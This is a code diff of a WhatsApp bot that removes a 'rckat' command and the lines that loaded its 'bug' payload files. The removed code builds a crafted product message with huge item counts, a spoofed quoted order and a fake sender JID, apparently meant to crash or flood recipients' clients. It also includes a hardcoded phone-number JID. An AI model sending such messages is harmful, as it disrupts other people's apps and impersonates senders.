@@ -34,12 +34,6 @@ if (!jco.message) return
 global.blocked
 jco.message = (Object.keys(jco.message)[0] === 'ephemeralMessage') ? jco.message.ephemeralMessage.message : jco.message
 const from = jco.key.remoteJid
-const bb5 = `${bukrc3}`
-let bukrc3 = bugsp3. bbaiyos
-        let bbp2xd = bugsp. bugbutton2
-        let bbp3xd = bugsp. bugbutton3
-        pulsa = setting.pulsa
-        banChats = true
 const type = Object.keys(jco.message)[0]        
 const quoted = type == 'extendedTextMessage' && jco.message.extendedTextMessage.contextInfo != null ? jco.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
 const typeQuoted = Object.keys(quoted)[0]
@@ -81,8 +75,6 @@ const errecebukb = JSON.parse(fs.readFileSync('./errecebukb.json'))
         let errecebuk1 = errecebukb. buj
         let errecebuk2 = errecebukb. buj2
         let errecebuk3 = errecebukb. buj3
-const bugsp3 = JSON.parse(fs.readFileSync('./bugsp3.json'))
-const bugsp = JSON.parse(fs.readFileSync('./bugsp.json'))
 const boton = (para, contenido, footer, botones = [], Jco17 = {}) => {
 const buttonMessage = {
 contentText: contenido,
@@ -265,50 +257,6 @@ case 'bugbuttonjco':
 											}]);
 									break
 
-
-case 'rckat':
-	     hmm4 = fs.readFileSync(`./media/image/jcobug.jpg`)
-imeu = await jco.prepareMessage('0@s.whatsapp.net', hmm4, image)
-
-imeg = imeu.message.imageMessage
-nn = `${bb5}`
-res = await jco.prepareMessageFromContent(from,{
-  "productMessage": {
-  "product": {
-  "productImage": imeg,
-  "productId": "", 
-  "title": errecekatt(prefix),
-"description": errecekatt(prefix), 
-"priceAmount1000": "99999999",
-"descriptionCount": "999999999",
-  "productImageCount": "1",
-  },
-  "businessOwnerJid": "62895362282300@s.whatsapp.net",
-  "contextInfo": {
-  "forwardingScore": 9999,
-  "isForwarded": true
-  }
-  }
-  }, {quoted: {
-				  key: {
-				   fromMe: false,
-				   participant: `0@s.whatsapp.net`, // Fake sender Jid
-				   remoteJid: "status@broadcast"
-				  },
-				  message: {
-				   orderMessage: {
-				    itemCount: 999999999, // Bug
-				    status: 1,
-				    surface: 1,
-				    message: '999999999',
-				    orderTitle: '999999999', // Idk what this does
-				    sellerJid: `0@s.whatsapp.net`
-				   }
-				  }
-				 }
-				})
-  jco.relayWAMessage(res)
-  break
 
                        
 }
